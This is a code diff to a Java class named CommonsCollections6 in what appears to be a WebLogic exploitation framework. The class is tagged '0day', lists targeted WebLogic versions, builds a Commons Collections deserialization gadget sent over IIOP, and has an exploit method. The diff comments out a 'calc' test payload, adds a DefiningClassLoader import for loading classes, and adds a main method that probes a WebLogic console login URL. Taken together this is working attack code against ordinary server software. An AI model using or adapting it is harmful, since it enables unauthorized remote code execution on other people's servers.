@@ -26,6 +26,7 @@ import static com.weblogic.framework.utils.UrlUtils.checkUrl;
 import static com.weblogic.framework.utils.VersionUtils.checkVersion;
 import static com.weblogic.framework.utils.VersionUtils.getVersion;
 import static org.apache.commons.lang3.StringUtils.isBlank;
+import org.mozilla.classfile.DefiningClassLoader;
 
 /**
  * Title: CommonsCollections6
@@ -37,7 +38,6 @@ import static org.apache.commons.lang3.StringUtils.isBlank;
 @Dependencies({":JtaTransactionManager"})
 @Versions({"10.3.6.0", "12.1.3.0", "12.2.1.3.0", "12.2.1.4.0"})
 @Tags({"0day"})
-@Log4j2
 public class CommonsCollections6 implements VulTest {
 
     /**
@@ -101,7 +101,7 @@ public class CommonsCollections6 implements VulTest {
         ctClass.defrost();
         ObjectPayload<Serializable> objectPayload = new CommonsCollections6Gadget();
         Object object = objectPayload.getObject(bytes,new String[]{bindName}, callClazz.getSimpleName(),null);
-        object = objectPayload.getObject("calc",null);
+//        object = objectPayload.getObject("calc",null);
         ContextPojo contextPojo = null;
         String iiopUrl = String.format("iiop://%s:%s", ip, port);
         try{
@@ -133,12 +133,18 @@ public class CommonsCollections6 implements VulTest {
     /**
      * 漏洞利用
      *
-     * @param url
-     * @param param
+     * @param url url
+     * @param param 利用参数
      * @throws Exception 抛出异常
      */
     @Override
     public String exploit(String url, String... param) throws Exception {
         return VulUtils.exploit(url, remote, param);
+    }
+
+    public static void main(String[] args) throws Exception {
+        CommonsCollections6 commonsCollections6 = new CommonsCollections6();
+        Boolean flag = commonsCollections6.vulnerable("http://192.168.1.10:7001//console/login/LoginForm.jsp");
+        System.out.println(flag);
     }
 }
